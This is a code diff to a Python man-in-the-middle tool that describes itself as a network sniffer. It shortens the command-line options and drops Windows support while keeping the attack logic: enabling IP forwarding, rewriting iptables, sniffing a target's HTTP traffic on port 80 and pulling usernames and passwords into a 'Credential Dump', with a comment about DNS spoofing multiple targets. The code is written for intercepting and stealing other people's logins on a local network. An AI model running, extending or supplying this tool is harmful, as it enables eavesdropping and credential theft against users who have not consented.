@@ -28,20 +28,12 @@ else:
     exit(1)
 
 parser = argparse.ArgumentParser(description='Device network sniffer')
-parser.add_argument('--network', help='Network to scan (e.g., "192.168.0.0/24")', required=True)
-parser.add_argument('--iface', help='Network interface to use', required=True)
-parser.add_argument('--routerip', help='IP of your home router', required=True)
+parser.add_argument('-n', help='Network to scan (e.g., "192.168.0.0/24")', required=True)
+parser.add_argument('-i', help='Network interface to use', required=True)
+parser.add_argument('-r', help='IP of your home router', required=True)
 opts = parser.parse_args()
 
-# Function to enable IP forwarding for Windows
-def enable_ip_forwarding_windows():
-    try:
-        subprocess.check_call("netsh interface ipv4 set global forwarding=enabled", shell=True)
-        print(f'{Fore.GREEN}IP forwarding enabled on Windows!{Style.RESET_ALL}')
-    except subprocess.CalledProcessError as e:
-        print(f'{Fore.RED}Failed to enable IP forwarding on Windows: {e}{Style.RESET_ALL}')
-
-# Modify the 'enable_ip_forwarding' method to handle both Linux and Windows
+# DNS Spoofing for Multiple Targets
 class Device:
     def __init__(self, routerip, targetip, iface):
         self.routerip = routerip
@@ -118,7 +110,7 @@ class Device:
                         for key in creds_found:
                             if key in ['user', 'username', 'login', 'uname', 'user_id', 'pseudonym', 'phone']:
                                 login = creds_found[key]
-                            if key in ['password', 'pass', 'pwd', 'passwd', 'heslo'] :
+                            if key in ['password', 'pass', 'pwd', 'passwd', 'heslo']:
                                 pwd = creds_found[key]
 
                         print(f"{Fore.GREEN}Credential Dump:{Style.RESET_ALL}")
@@ -133,13 +125,8 @@ class Device:
               filter=f'tcp port 80 and host {self.targetip}', store=0)
 
     def enable_ip_forwarding(self):
-        if platform.system() == "Windows":
-            enable_ip_forwarding_windows()
-        elif platform.system() == "Linux":
-            subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
-            print(f'{Fore.GREEN}IP forwarding enabled on Linux!{Style.RESET_ALL}')
-        else:
-            print(f'{Fore.RED}Unsupported OS for IP forwarding.{Style.RESET_ALL}')
+        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+        print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')
 
     def set_iptables(self):
         subprocess.call(f"iptables --flush", shell=True)
